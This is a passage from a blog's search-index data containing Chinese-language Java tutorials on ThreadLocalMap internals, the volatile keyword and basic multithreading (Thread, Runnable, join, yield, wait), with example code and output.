entries&quot; in the code that follows. * * Entry继承WeakReference，并且用ThreadLocal作为key. * 如果key为null(entry.get() == null)，意味着key不再被引用， * 因此这时候entry也可以从table中清除。 */ static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; { /** The value associated with this ThreadLocal. */ Object value; Entry(ThreadLocal&lt;?&gt; k, Object v) { super(k); value = v; } }/** * 初始容量 —— 必须是2的整次幂 * The initial capacity -- MUST be a power of two. */ private static final int INITIAL_CAPACITY = 16; /** * 存放数据的table，Entry类的定义在下面分析 * 同样，数组长度必须是2的整次幂。 * The table, resized as necessary. * table.length MUST always be a power of two. */ private Entry[] table; /** * 数组里面entrys的个数，可以用于判断table当前使用量是否超过阈值。 * The number of entries in the table */ private int size = 0; /** * 进行扩容的阈值，表使用量大于它的时候进行扩容。 * The next size value at which to resize */ private int threshold; // Default to 0 # 弱引用和内存泄漏 弱引用相关概念 强引用（“Strong” Reference），就是我们最常见的普通对象引用，只要还有强引用指向一个对象，就能表明对象还 “活着”，垃圾回收器就不会回收这种对象 弱引用（WeakReference），垃圾回收器一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存 # 内存泄漏相关概念 Memory overflow: 内存溢出，没有足够的内存提供申请者使用 Memory leak: 内存泄漏是指程序中己动态分配的堆内存由于某种原因程序未释放或无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。内存泄漏的堆积终将导致内存溢出 # 内存泄漏与强弱引用关系 ThreadLocal 内存结构 如果 key 使用强引用，也就是上图中的红色背景框部分 业务代码中使用完 ThreadLocal ，threadLocal Ref 被回收了 因为 threadLocalMap 的 Entry 强引用了 threadLocal，造成 threadLocal 无法被回收 在没有手动删除这个 Entry 以及 CurrentThread 依然运行的前提下，始终有强引用链 threadRef-&gt;currentThread-&gt;threadLocalMap-&gt;entry，Entry 就不会被回收（Entry 中包括了 ThreadLocal 实例和 value），导致 Entry 内存泄漏 如果 key 使用弱引用，也就是上图中的红色背景框部分 业务代码中使用完 ThreadLocal ，threadLocal Ref 被回收了 由于 ThreadLocalMap 只持有 ThreadLocal 的弱引用，没有任何强引用指向 threadlocal 实例，所以 threadlocal 就可以顺利被 gc 回收，此时 Entry 中的 key=null 但是在没有手动删除这个 Entry 以及 CurrentThread 依然运行的前提下，也存在有强引用链 threadRef-&gt;currentThread-&gt;threadLocalMap-&gt;entry -&gt; value ，value 不会被回收， 而这块 value 永远不会被访问到了，导致 value 内存泄漏 # 出现内存泄漏的真实原因 没有手动删除对应的 Entry 节点信息 ThreadLocal 对象使用完后，对应线程仍然在运行 # 避免内存泄漏的的两种方式 使用完 ThreadLocal，调用其 remove 方法删除对应的 Entry 使用完 ThreadLocal，当前 Thread 也随之运行结束 对于第一种方式很好控制，调用对应 remove () 方法即可，但是对于第二种方式，我们是很难控制的，正因为不好控制，这也是为什么 ThreadLocalMap 里对应的 Entry 对象继承弱引用的原因，因为使用了弱引用，当 ThreadLocal 使用完后，key 的引用就会为 null，而在调用 ThreadLocal 中的 get ()/set () 方法时，当判断 key 为 null 时会将 value 置为 null，这就就会在 jvm 下次 GC 时将对应的 Entry 对象回收，从而避免内存泄漏问题的出现。 # hash 冲突问题及解决方法 首先从 ThreadLocal 的 set () 方法入手 123456789101112131415161718public void set(T value) { Thread t = Thread.currentThread(); ThreadLocal.ThreadLocalMap map = getMap(t); if (map != null) //调用了ThreadLocalMap的set方法 map.set(this, value); else createMap(t, value); } ThreadLocal.ThreadLocalMap getMap(Thread t) { return t.threadLocals; } void createMap(Thread t, T firstValue) { //调用了ThreadLocalMap的构造方法 t.threadLocals = new ThreadLocal.ThreadLocalMap(this, firstValue); } 构造方法 ThreadLocalMap(ThreadLocal&lt;?&gt; firstKey, Object firstValue) /* * firstKey : 本ThreadLocal实例(this) * firstValue ： 要保存的线程本地变量 */ ThreadLocalMap(ThreadLocal&lt;?&gt; firstKey, Object firstValue) { //初始化table table = new ThreadLocal.ThreadLocalMap.Entry[INITIAL_CAPACITY]; //计算索引(重点代码） int i = firstKey.threadLocalHashCode &amp; (INITIAL_CAPACITY - 1); //设置值 table[i] = new ThreadLocal.ThreadLocalMap.Entry(firstKey, firstValue); size = 1; //设置阈值 setThreshold(INITIAL_CAPACITY); } 123456构造函数首先创建一个长度为16的Entry数组，然后计算出firstKey对应的索引，然后存储到table中，并设置size和threshold分析：int i = firstKey.threadLocalHashCode &amp; (INITIAL_CAPACITY - 1)关于：firstKey.threadLocalHashCode private final int threadLocalHashCode = nextHashCode(); private static int nextHashCode() { return nextHashCode.getAndAdd(HASH_INCREMENT); } //AtomicInteger是一个提供原子操作的Integer类，通过线程安全的方式操作加减,适合高并发情况下的使用 private static AtomicInteger nextHashCode = new AtomicInteger(); //特殊的hash值 private static final int HASH_INCREMENT = 0x61c88647; 1234567这里定义了一个AtomicInteger类型，每次获取当前值并加上HASH_INCREMENT，HASH_INCREMENT = 0x61c88647,这个值跟斐波那契数列（黄金分割数）有关，其主要目的就是为了让哈希码能均匀的分布在2的n次方的数组里, 也就是Entry[] table中，这样做可以尽量避免hash冲突关于：&amp; (INITIAL_CAPACITY - 1)计算hash的时候里面采用了hashCode &amp; (size - 1)的算法，这相当于取模运算hashCode % size的一个更高效的实现。正是因为这种算法，我们要求size必须是2的整次幂，这也能保证在索引不越界的前提下，使得hash发生冲突的次数减小ThreadLocalMap中的set方法 private void set(ThreadLocal&lt;?&gt; key, Object value) { ThreadLocal.ThreadLocalMap.Entry[] tab = table; int len = tab.length; //计算索引(重点代码，刚才分析过了） int i = key.threadLocalHashCode &amp; (len-1); /** * 使用线性探测法查找元素（重点代码） */ for (ThreadLocal.ThreadLocalMap.Entry e = tab[i]; e != null; e = tab[i = nextIndex(i, len)]) { ThreadLocal&lt;?&gt; k = e.get(); //ThreadLocal 对应的 key 存在，直接覆盖之前的值 if (k == key) { e.value = value; return; } // key为 null，但是值不为 null，说明之前的 ThreadLocal 对象已经被回收了， // 当前数组中的 Entry 是一个陈旧（stale）的元素 if (k == null) { //用新元素替换陈旧的元素，这个方法进行了不少的垃圾清理动作，防止内存泄漏 replaceStaleEntry(key, value, i); return; } } //ThreadLocal对应的key不存在并且没有找到陈旧的元素，则在空元素的位置创建一个新的Entry。 tab[i] = new Entry(key, value); int sz = ++size; /** * cleanSomeSlots用于清除那些e.get()==null的元素， * 这种数据key关联的对象已经被回收，所以这个Entry(table[index])可以被置null。 * 如果没有清除任何entry,并且当前使用量达到了负载因子所定义(长度的2/3)，那么进行 * rehash（执行一次全表的扫描清理工作） */ if (!cleanSomeSlots(i, sz) &amp;&amp; sz &gt;= threshold) rehash(); } /** * 获取环形数组的下一个索引 */ private static int nextIndex(int i, int len) { return ((i + 1 &lt; len) ? i + 1 : 0); } # 代码执行流程： 1. 首先还是根据 key 计算出索引 i，然后查找 i 位置上的 Entry 2. 若是 Entry 已经存在并且 key 等于传入的 key，那么这时候直接给这个 Entry 赋新的 value 值 3. 若是 Entry 存在，但是 key 为 null，则调用 replaceStaleEntry 来更换这个 key 为空的 Entry 4. 不断循环检测，直到遇到为 null 的地方，这时候要是还没在循环过程中 return，那么就在这个 null 的位置新建一个 Entry，并且插入，同时 size 增加 1 5. 最后调用 cleanSomeSlots，清理 key 为 null 的 Entry，最后返回是否清理了 Entry，接下来再判断 sz 是否 &gt;= thresgold 达到了 rehash 的条件，达到的话就会调用 rehash 函数执行一次全表的扫描清理 分析 ： ThreadLocalMap 使用线性探测法来解决哈希冲突的 1. 该方法一次探测下一个地址，直到有空的地址后插入，若整个空间都找不到空余的地址，则产生溢出 2. 假设当前 table 长度为 16，也就是说如果计算出来 key 的 hash 值为 14，如果 table [14] 上已经有值，并且其 key 与当前 key 不一致，那么就发生了 hash 冲突，这个时候将 14 加 1 得到 15，取 table [15] 进行判断，这个时候如果还是冲突会回到 0，取 table [0], 以此类推，直到可以插入 3. 可以把 Entry [] table 看成一个环形数组 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/07/09/%E3%80%90Java%E3%80%91TheadLocal/"},{"title":"Volatile关键字","text":"# Volatile 关键字 Volatile 关键字的作用主要有如下两个： 线程的可见性：当一个线程修改一个共享变量时，另外一个线程能读到这个修改的值。 顺序一致性：禁止指令重排序。 # 一、线程可见性 我们先通过一个例子来看看线程的可见性： 1234567891011121314151617181920212223242526public class VolatileTest { boolean flag = true; public void updateFlag() { this.flag = false; System.out.println(&quot;修改flag值为：&quot; + this.flag); } public static void main(String[] args) { VolatileTest test = new VolatileTest(); new Thread(() -&gt; { while (test.flag) { } System.out.println(Thread.currentThread().getName() + &quot;结束&quot;); }, &quot;Thread1&quot;).start(); new Thread(() -&gt; { try { Thread.sleep(2000); test.updateFlag(); } catch (InterruptedException e) { } }, &quot;Thread2&quot;).start(); }} 打印结果如下，我们可以看到虽然线程 Thread2 已经把 flag 修改为 false 了，但是线程 Thread1 没有读取到 flag 修改后的值，线程一直在运行 1修改flag值为：false 我们把 flag 变量加上 volatile： 1volatile boolean flag = true; 重新运行程序，打印结果如下。Thread1 结束，说明 Thread1 读取到了 flage 修改后的值 12修改flag值为：falseThread1结束 说到可见性，我们需要先了解一下 Java 内存模型，Java 内存模型如下所示： 线程之间的共享变量存储在主内存中（Main Memory）中，每个线程都一个都有一个私有的本地内存（Local Memory），本地内存中存储了该线程以读 / 写共享变量的副本。 所以当一个线程把主内存中的共享变量读取到自己的本地内存中，然后做了更新。在还没有把共享变量刷新的主内存的时候，另外一个线程是看不到的。 如何把修改后的值刷新到主内存中的？ 现代的处理器使用写缓冲区临时保存向内存写入的数据。写缓冲区可以保证指令流水线持续运行，它可以避免由于处理器停顿下来等向内存写入数据而产生的延迟。同时，通过以批处理的方式刷新写缓冲区，以及合并写缓冲区中对同一内存地址的多次写，较少对内存总线的占用。但是什么时候写入到内存是不知道的。 所以就引入了 volatile，volatile 是如何保证可见性的呢？ 在 X86 处理器下通过工具获取 JIT 编译器生成的汇编指令来查看对 volatile 进行写操作时，会多出 lock addl。Lock 前缀的指令在多核处理器下会引发两件事情： 1. 将当前处理器缓存行的数据写回到系统内存。 2. 这个写回内存的操作会使其他 cpu 里缓存了该内存地址的数据无效。 如果声明了 volatile 的变量进行写操作，JVM 就会向处理器发送一条 Lock 前缀的指令，将这个变量所在缓存行的数据写回到系统内存。但是，就算写回到内存，如果其他处理器缓存的还是旧的，在执行操作就会有问题。所以，在多处理器下，为了保证各个处理器的缓存是一致的，就会实现缓存一致性协议，每个处理器通过嗅探在总线传播的数据来检查自己缓存的值是不是过期了，当处理器发现自己缓存行对应的内存地址被修改，就会将当前处理器的缓存行设置成无效状态，当处理器对这个数据进行修改操作的时候，会重新从系统内存中把数据读到处理器缓存里。 # 二、顺序一致性 在执行程序时，为了提高性能，编译器和处理器常常会对指令做重排序。重排序分为如下三种： 1 属于编译器重排序，2 和 3 属于处理器重排序。这些重排序可能会导致多线程程序出现内存可见性问题。 当变量声明为 volatile 时，Java 编译器在生成指令序列时，会插入内存屏障指令。通过内存屏障指令来禁止重排序。 JMM 内存屏障插入策略如下： 在每个 volatile 写操作的前面插入一个 StoreStore 屏障，后面插入一个 StoreLoad 屏障。 在每个 volatile 读操作后面插入一个 LoadLoad，LoadStore 屏障。 Volatile 写插入内存屏障后生成指令序列示意图： Volatile 读插入内存屏障后生成指令序列示意图： 通过上面这些我们可以得出如下结论：编译器不会对 volatile 读与 volatile 读后面的任意内存操作重排序；编译器不会对 volatile 写与 volatile 写前面的任意内存操作重排序。 防止重排序使用案例： 12345678910111213public class SafeDoubleCheckedLocking { private volatile static Instance instane; public static Instance getInstane(){ if(instane==null){ synchronized (SafeDoubleCheckedLocking.class){ if(instane==null){ instane=new Instance(); } } } return instane; }} 创建一个对象主要分为如下三步： 分配对象的内存空间。 初始化对象。 设置 instance 指向内存空间。 如果 instane 不加 volatile，上面的 2，3 可能会发生重排序。假设 A，B 两个线程同时获取，A 线程获取到了锁，发生了指令重排序，先设置了 instance 指向内存空间。这个时候 B 线程也来获取，instance 不为空，这样 B 拿到了没有初始化完成的单例对象（如下图） 二、Volatile 与 Synchronized 比较 1.Volatile 是轻量级的 synchronized，因为它不会引起上下文的切换和调度，所以 Volatile 性能更好。 2.Volatile 只能修饰变量，synchronized 可以修饰方法，静态方法，代码块。 3.Volatile 对任意单个变量的读 / 写具有原子性，但是类似于 i++ 这种复合操作不具有原子性。而锁的互斥执行的特性可以确保对整个临界区代码执行具有原子性。 4. 多线程访问 volatile 不会发生阻塞，而 synchronized 会发生阻塞。 5.volatile 是变量在多线程之间的可见性，synchronize 是多线程之间访问资源的同步性。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/12/25/%E3%80%90Java%E3%80%91Volatile%E5%85%B3%E9%94%AE%E5%AD%97/"},{"title":"Java多线程学习（吐血超详细总结）","text":"# Java 多线程学习（吐血超详细总结） 写在前面的话：此文只能说是 java 多线程的一个入门，其实 Java 里头线程完全可以写一本书了，但是如果最基本的你都学掌握好，又怎么能更上一个台阶呢？如果你觉得此文很简单，那推荐你看看 Java 并发包的的线程池（Java 并发编程与技术内幕：线程池深入理解），或者看这个专栏：Java 并发编程与技术内幕。你将会对 Java 里头的高并发场景下的线程有更加深刻的理解。 目录 (?)[-] 一扩展 javalangThread 类 二实现 javalangRunnable 接口 三 Thread 和 Runnable 的区别 四线程状态转换 五线程调度 六常用函数说明 使用方式 为什么要用 join 方法 七常见线程名词解释 八线程同步 九线程数据传递 ​ 本文主要讲了 java 中多线程的使用方法、线程同步、线程数据传递、线程状态及相应的一些线程函数用法、概述等。在这之前，首先让我们来了解下在操作系统中进程和线程的区别： 进程：每个进程都有独立的代码和数据空间（进程上下文），进程间的切换会有较大的开销，一个进程包含 1–n 个线程。（进程是资源分配的最小单位） 线程：同一类线程共享代码和数据空间，每个线程有独立的运行栈和程序计数器 (PC)，线程切换开销小。（线程是 cpu 调度的最小单位） 线程和进程一样分为五个阶段：创建、就绪、运行、阻塞、终止。 多进程是指操作系统能同时运行多个任务（程序）。 多线程是指在同一程序中有多个顺序流在执行。 在 java 中要想实现多线程，有两种手段，一种是继续 Thread 类，另外一种是实现 Runable 接口.(其实准确来讲，应该有三种，还有一种是实现 Callable 接口，并与 Future、线程池结合使用，此文这里不讲这个，有兴趣看这里 Java 并发编程与技术内幕：Callable、Future、FutureTask、CompletionService ) # 一、扩展 java.lang.Thread 类 这里继承 Thread 类的方法是比较常用的一种，如果说你只是想起一条线程。没有什么其它特殊的要求，那么可以使用 Thread.（笔者推荐使用 Runable，后头会说明为什么）。下面来看一个简单的实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package com.multithread.learning;class Thread1 extends Thread{ private String name; public Thread1(String name) { this.name=name; } public void run() { for (int i = 0; i &lt; 5; i++) { System.out.println(name + &quot;运行 : &quot; + i); try { sleep((int) Math.random() * 10); } catch (InterruptedException e) { e.printStackTrace(); } } }}public class Main { public static void main(String[] args) { Thread1 mTh1=new Thread1(&quot;A&quot;); Thread1 mTh2=new Thread1(&quot;B&quot;); mTh1.start(); mTh2.start(); } } 输出： A 运行 : 0 B 运行 : 0 A 运行 : 1 A 运行 : 2 A 运行 : 3 A 运行 : 4 B 运行 : 1 B 运行 : 2 B 运行 : 3 B 运行 : 4 再运行一下： A 运行 : 0 B 运行 : 0 B 运行 : 1 B 运行 : 2 B 运行 : 3 B 运行 : 4 A 运行 : 1 A 运行 : 2 A 运行 : 3 A 运行 : 4 说明： 程序启动运行 main 时候，java 虚拟机启动一个进程，主线程 main 在 main () 调用时候被创建。随着调用 MitiSay 的两个对象的 start 方法，另外两个线程也启动了，这样，整个应用就在多线程下运行。 注意：start () 方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。 从程序运行的结果可以发现，多线程程序是乱序执行。因此，只有乱序执行的代码才有必要设计为多线程。 Thread.sleep () 方法调用目的是不让当前线程独自霸占该进程所获取的 CPU 资源，以留出一定时间给其他线程执行的机会。 实际上所有的多线程代码执行顺序都是不确定的，每次执行的结果都是随机的。 但是 start 方法重复调用的话，会出现 java.lang.IllegalThreadStateException 异常。 12345678910111213Thread1 mTh1=new Thread1(&quot;A&quot;);Thread1 mTh2=mTh1;mTh1.start();mTh2.start(); 输出： Exception in thread “main” java.lang.IllegalThreadStateException at java.lang.Thread.start(Unknown Source) at com.multithread.learning.Main.main(Main.java:31) A 运行 : 0 A 运行 : 1 A 运行 : 2 A 运行 : 3 A 运行 : 4 # 二、实现 java.lang.Runnable 接口 采用 Runnable 也是非常常见的一种，我们只需要重写 run 方法即可。下面也来看个实例。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137/** *@functon 多线程学习 *@author 林炳文 *@time 2015.3.9 */package com.multithread.runnable;class Thread2 implements Runnable{ private String name; public Thread2(String name) { this.name=name; } @Override public void run() { for (int i = 0; i &lt; 5; i++) { System.out.println(name + &quot;运行 : &quot; + i); try { Thread.sleep((int) Math.random() * 10); } catch (InterruptedException e) { e.printStackTrace(); } } } }public class Main { public static void main(String[] args) { new Thread(new Thread2(&quot;C&quot;)).start(); new Thread(new Thread2(&quot;D&quot;)).start(); } } 输出： C 运行 : 0 D 运行 : 0 D 运行 : 1 C 运行 : 1 D 运行 : 2 C 运行 : 2 D 运行 : 3 C 运行 : 3 D 运行 : 4 C 运行 : 4 说明： Thread2 类通过实现 Runnable 接口，使得该类有了多线程类的特征。run（）方法是多线程程序的一个约定。所有的多线程代码都在 run 方法里面。Thread 类实际上也是实现了 Runnable 接口的类。 在启动的多线程的时候，需要先通过 Thread 类的构造方法 Thread (Runnable target) 构造出对象，然后调用 Thread 对象的 start () 方法来运行多线程代码。 实际上所有的多线程代码都是通过运行 Thread 的 start () 方法来运行的。因此，不管是扩展 Thread 类还是实现 Runnable 接口来实现多线程，最终还是通过 Thread 的对象的 API 来控制线程的，熟悉 Thread 类的 API 是进行多线程编程的基础。 # 三、Thread 和 Runnable 的区别 如果一个类继承 Thread，则不适合资源共享。但是如果实现了 Runable 接口的话，则很容易的实现资源共享。 ** 总结： ** 实现 Runnable 接口比继承 Thread 类所具有的优势： 1）：适合多个相同的程序代码的线程去处理同一个资源 2）：可以避免 java 中的单继承的限制 3）：增加程序的健壮性，代码可以被多个线程共享，代码和数据独立 4）：线程池只能放入实现 Runable 或 callable 类线程，不能直接放入继承 Thread 的类 * 提醒一下大家：**main** 方法其实也是一个线程。在 **java** 中所以的线程都是同时启动的，至于什么时候，哪个先执行，完全看谁先得到 **CPU** 的资源。* 在 java 中，每次程序运行至少启动 2 个线程。一个是 main 线程，一个是垃圾收集线程。因为每当使用 java 命令执行一个类的时候，实际上都会启动一个ＪＶＭ，每一个ｊＶＭ实习在就是在操作系统中启动了一个进程。 # 四、线程状态转换 下面的这个图非常重要！你如果看懂了这个图，那么对于多线程的理解将会更加深刻！ 1、新建状态（New）：新创建了一个线程对象。 2、就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的 start () 方法。该状态的线程位于可运行线程池中，变得可运行，等待获取 CPU 的使用权。 3、运行状态（Running）：就绪状态的线程获取了 CPU，执行程序代码。 4、阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃 CPU 使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种： （一）、等待阻塞：运行的线程执行 wait () 方法，JVM 会把该线程放入等待池中。(wait 会释放持有的锁) （二）、同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则 JVM 会把该线程放入锁池中。 （三）、其他阻塞：运行的线程执行 sleep () 或 join () 方法，或者发出了 I/O 请求时，JVM 会把该线程置为阻塞状态。当 sleep () 状态超时、join () 等待线程终止或者超时、或者 I/O 处理完毕时，线程重新转入就绪状态。（注意，sleep 是不会释放持有的锁） 5、死亡状态（Dead）：线程执行完了或者因异常退出了 run () 方法，该线程结束生命周期。 # 五、线程调度 线程的调度 1、调整线程优先级：Java 线程有优先级，优先级高的线程会获得较多的运行机会。 Java 线程的优先级用整数表示，取值范围是 1~10，Thread 类有以下三个静态常量： 123456static int MAX_PRIORITY 线程可以具有的最高优先级，取值为10。static int MIN_PRIORITY 线程可以具有的最低优先级，取值为1。static int NORM_PRIORITY 分配给线程的默认优先级，取值为5。 Thread 类的 setPriority () 和 getPriority () 方法分别用来设置和获取线程的优先级。 每个线程都有默认的优先级。主线程的默认优先级为 Thread.NORM_PRIORITY。 线程的优先级有继承关系，比如 A 线程中创建了 B 线程，那么 B 将和 A 具有相同的优先级。 JVM 提供了 10 个线程优先级，但与常见的操作系统都不能很好的映射。如果希望程序能移植到各个操作系统中，应该仅仅使用 Thread 类有以下三个静态常量作为优先级，这样能保证同样的优先级采用了同样的调度方式。 2、线程睡眠：Thread.sleep (long millis) 方法，使线程转到阻塞状态。millis 参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep () 平台移植性好。 3、线程等待：Object 类中的 wait () 方法，导致当前的线程等待，直到其他线程调用此对象的 notify () 方法或 notifyAll () 唤醒方法。这个两个唤醒方法也是 Object 类中的方法，行为等价于调用 wait (0) 一样。 4、线程让步：Thread.yield () 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。 5、线程加入：join () 方法，等待其他线程终止。在当前线程中调用另一个线程的 join () 方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。 6、线程唤醒：Object 类中的 notify () 方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 wait 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个 notifyAll ()，唤醒在此对象监视器上等待的所有线程。 注意：Thread 中 suspend () 和 resume () 两个方法在 JDK1.5 中已经废除，不再介绍。因为有死锁倾向。 # 六、常用函数说明 **①sleep (long millis): 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行） ②join (): 指等待 t 线程终止。** # 使用方式。 join 是 Thread 类的一个方法，启动线程后直接调用，即 join () 的作用是：“等待该线程终止”，这里需要理解的就是该线程是指的主线程等待子线程的终止。也就是在子线程调用了 join () 方法后面的代码，只有等到子线程结束了才能执行。 1Thread t = new AThread(); t.start(); t.join(); # 为什么要用 join () 方法 在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到 join () 方法了。 不加 join。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165/** *@functon 多线程学习,join *@author 林炳文 *@time 2015.3.9 */package com.multithread.join;class Thread1 extends Thread{ private String name; public Thread1(String name) { super(name); this.name=name; } public void run() { System.out.println(Thread.currentThread().getName() + &quot; 线程运行开始!&quot;); for (int i = 0; i &lt; 5; i++) { System.out.println(&quot;子线程&quot;+name + &quot;运行 : &quot; + i); try { sleep((int) Math.random() * 10); } catch (InterruptedException e) { e.printStackTrace(); } } System.out.println(Thread.currentThread().getName() + &quot; 线程运行结束!&quot;); }} public class Main { public static void main(String[] args) { System.out.println(Thread.currentThread().getName()+&quot;主线程运行开始!&quot;); Thread1 mTh1=new Thread1(&quot;A&quot;); Thread1 mTh2=new Thread1(&quot;B&quot;); mTh1.start(); mTh2.start(); System.out.println(Thread.currentThread().getName()+ &quot;主线程运行结束!&quot;); } } 输出结果： main 主线程运行开始！ main 主线程运行结束！ B 线程运行开始！ 子线程 B 运行 : 0 A 线程运行开始！ 子线程 A 运行 : 0 子线程 B 运行 : 1 子线程 A 运行 : 1 子线程 A 运行 : 2 子线程 A 运行 : 3 子线程 A 运行 : 4 A 线程运行结束！ 子线程 B 运行 : 2 子线程 B 运行 : 3 子线程 B 运行 : 4 B 线程运行结束！ 发现主线程比子线程早结束 加 join 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889public class Main { public static void main(String[] args) { System.out.println(Thread.currentThread().getName()+&quot;主线程运行开始!&quot;); Thread1 mTh1=new Thread1(&quot;A&quot;); Thread1 mTh2=new Thread1(&quot;B&quot;); mTh1.start(); mTh2.start(); try { mTh1.join(); } catch (InterruptedException e) { e.printStackTrace(); } try { mTh2.join(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(Thread.currentThread().getName()+ &quot;主线程运行结束!&quot;); } } 运行结果： main 主线程运行开始！ A 线程运行开始！ 子线程 A 运行 : 0 B 线程运行开始！ 子线程 B 运行 : 0 子线程 A 运行 : 1 子线程 B 运行 : 1 子线程 A 运行 : 2 子线程 B 运行 : 2 子线程 A 运行 : 3 子线程 B 运行 : 3 子线程 A 运行 : 4 子线程 B 运行 : 4 A 线程运行结束！ 主线程一定会等子线程都结束了才结束 ③yield (): 暂停当前正在执行的线程对象，并执行其他线程。 ​ Thread.yield () 方法作用是：暂停当前正在执行的线程对象，并执行其他线程。 ​ ****yield () 应该做的是让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。**** 因此，使用 yield () 的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证 yield () 达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。 结论：yield () 从未导致线程转到等待 / 睡眠 / 阻塞状态。在大多数情况下，yield () 将导致线程从运行状态转到可运行状态，但有可能没有效果。可看上面的图。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137/** *@functon 多线程学习 yield *@author 林炳文 *@time 2015.3.9 */package com.multithread.yield;class ThreadYield extends Thread{ public ThreadYield(String name) { super(name); } @Override public void run() { for (int i = 1; i &lt;= 50; i++) { System.out.println(&quot;&quot; + this.getName() + &quot;-----&quot; + i); // 当i为30时，该线程就会把CPU时间让掉，让其他或者自己的线程执行（也就是谁先抢到谁执行） if (i ==30) { this.yield(); } } }} public class Main { public static void main(String[] args) { ThreadYield yt1 = new ThreadYield(&quot;张三&quot;); ThreadYield yt2 = new ThreadYield(&quot;李四&quot;); yt1.start(); yt2.start(); } } 运行结果： 第一种情况：李四（线程）当执行到 30 时会 CPU 时间让掉，这时张三（线程）抢到 CPU 时间并执行。 第二种情况：李四（线程）当执行到 30 时会 CPU 时间让掉，这时李四（线程）抢到 CPU 时间并执行。 sleep () 和 yield () 的区别 sleep () 和 yield () 的区别):sleep () 使当前线程进入停滞状态，所以执行 sleep () 的线程在指定的时间内肯定不会被执行；yield () 只是使当前线程重新回到可执行状态，所以执行 yield () 的线程有可能在进入到可执行状态后马上又被执行。 sleep 方法使当前运行中的线程睡眼一段时间，进入不可运行状态，这段时间的长短是由程序设定的，yield 方法使当前线程让出 CPU 占有权，但让出的时间是不可设定的。实际上，yield () 方法对应了如下操作：先检测当前是否有相同优先级的线程处于同可运行状态，如有，则把 CPU 的占有权交给此线程，否则，继续运行原来的线程。所以 yield () 方法称为 “退让”，它把运行机会让给了同等优先级的其他线程 另外，sleep 方法允许较低优先级的线程获得运行机会，但 yield () 方法执行时，当前线程仍处在可运行状态，所以，不可能让出较低优先级的线程些时获得 CPU 占有权。在一个运行系统中，如果较高优先级的线程没有调用 sleep 方法，又没有受到 I\\O 阻塞，那么，较低优先级线程只能等待所有较高优先级的线程运行结束，才有机会运行。 ④setPriority (): 更改线程的优先级。 MIN_PRIORITY = 1 NORM_PRIORITY = 5 MAX_PRIORITY = 10 用法： 1234Thread4 t1 = new Thread4(&quot;t1&quot;);Thread4 t2 = new Thread4(&quot;t2&quot;);t1.setPriority(Thread.MAX_PRIORITY);t2.setPriority(Thread.MIN_PRIORITY); *⑤interrupt (): 不要以为它是中断某个线程！它只是线线程发送一个中断信号，让线程在无限等待时（如死锁时）能抛出抛出，从而结束线程，但是如果你吃掉了这个异常，那么 ** 这个线程还是不会中断的！* ⑥wait() Obj.wait ()，与 Obj.notify () 必须要与 synchronized (Obj) 一起使用，也就是 wait, 与 notify 是针对已经获取了 Obj 锁进行操作，从语法角度来说就是 Obj.wait (),Obj.notify 必须在 synchronized (Obj){…} 语句块内。从功能上来说 wait 就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的 notify () 唤醒该线程，才能继续获取对象锁，并继续执行。相应的 notify () 就是对对象锁的唤醒操作。但有一点需要注意的是 notify () 调用后，并不是马上就释放对象锁的，而是在相应的 synchronized (){} 语句块执行结束，自动释放锁后，JVM 会在 wait () 对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep () 与 Object.wait () 二者都可以暂停当前线程，释放 CPU 控制权，主要的区别在于 Object.wait () 